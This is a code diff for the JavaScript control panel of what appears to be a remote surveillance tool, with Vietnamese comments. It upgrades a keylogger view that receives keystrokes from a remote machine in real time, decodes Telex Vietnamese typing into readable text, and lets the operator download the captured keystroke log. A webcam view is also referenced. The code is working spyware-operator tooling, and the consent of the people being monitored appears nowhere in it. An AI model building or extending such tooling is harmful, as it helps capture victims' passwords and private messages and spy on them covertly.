@@ -2,6 +2,7 @@ import { CONFIG, state } from './config.js';
 import * as Utils from './utils.js';
 import * as Views from './views.js';
 import { startSignalR, sendCommand } from './network.js';
+import {processInputKey} from './utils.js';
 
 let previousObjectUrl = null;
 
@@ -98,10 +99,30 @@ function handleResponse(data) {
 
 function handleRealtimeUpdate(data) {
     if (state.currentView === 'keylogger' && data.event === 'key_pressed') {
-        const logArea = document.getElementById('keylogger-log');
-        if (logArea) {
-            logArea.value += data.data;
-            logArea.scrollTop = logArea.scrollHeight;
+        const rawKey = data.data;
+
+        // 1. Cập nhật Raw Log (Thô)
+        const logRaw = document.getElementById('keylogger-log-raw');
+        if (logRaw) {
+            logRaw.value += rawKey;
+            logRaw.scrollTop = logRaw.scrollHeight;
+            state.keylogger.rawBuffer += rawKey;
+        }
+
+        // 2. Cập nhật Processed Log (Văn bản sạch)
+        const logProcessed = document.getElementById('keylogger-log-processed');
+        const modeSelect = document.getElementById('keylog-mode');
+        
+        if (logProcessed) {
+            const currentMode = modeSelect ? modeSelect.value : 'english';
+            const currentBuffer = state.keylogger.processedBuffer || "";
+
+            // Gọi hàm xử lý thông minh
+            const newText = processInputKey(currentBuffer, rawKey, currentMode);
+            
+            state.keylogger.processedBuffer = newText;
+            logProcessed.value = newText;
+            logProcessed.scrollTop = logProcessed.scrollHeight;
         }
     }
 }
@@ -428,12 +449,44 @@ function attachViewListeners(view) {
         };
     }
     else if (view === 'keylogger') {
+        // Nút Bắt đầu/Dừng/Xóa giữ nguyên logic gửi lệnh
         document.getElementById('start-keylogger-btn').onclick = () => {
             sendCommand('keylogger_start');
             document.getElementById('keylogger-status').textContent = "Trạng thái: Đang Ghi...";
+            document.getElementById('keylogger-status').className = "text-xs font-bold text-green-600 animate-pulse px-2";
         };
-        document.getElementById('stop-keylogger-btn').onclick = () => sendCommand('keylogger_stop');
-        document.getElementById('clear-keylogger-btn').onclick = () => document.getElementById('keylogger-log').value = '';
+        document.getElementById('stop-keylogger-btn').onclick = () => {
+            sendCommand('keylogger_stop');
+            document.getElementById('keylogger-status').textContent = "Trạng thái: Đã dừng.";
+            document.getElementById('keylogger-status').className = "text-xs font-bold text-red-600 px-2";
+        };
+        document.getElementById('clear-keylogger-btn').onclick = () => {
+            document.getElementById('keylogger-log-raw').value = '';
+            document.getElementById('keylogger-log-processed').value = '';
+            state.keylogger.rawBuffer = "";
+            state.keylogger.processedBuffer = "";
+        };
+
+        // --- LOGIC MỚI: Đổi chế độ gõ ---
+        document.getElementById('keylog-mode').addEventListener('change', (e) => {
+            state.keylogger.mode = e.target.value;
+            document.getElementById('mode-indicator').textContent = e.target.value === 'telex' ? 'VN' : 'EN';
+            // Lưu ý: Việc đổi chế độ không làm thay đổi văn bản ĐÃ gõ, chỉ áp dụng cho ký tự TIẾP THEO.
+        });
+
+        // --- LOGIC MỚI: Tải về ---
+        document.getElementById('download-keylog-btn').onclick = () => {
+            const text = state.keylogger.processedBuffer;
+            if (!text) { alert("Chưa có nội dung để tải!"); return; }
+            
+            const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `Keylog_${new Date().toISOString().slice(0,19).replace(/[:T]/g,"-")}.txt`;
+            a.click();
+            URL.revokeObjectURL(url);
+        };
     }
     else if (view === 'webcam') {
         document.getElementById('webcam-on-btn').onclick = () => {
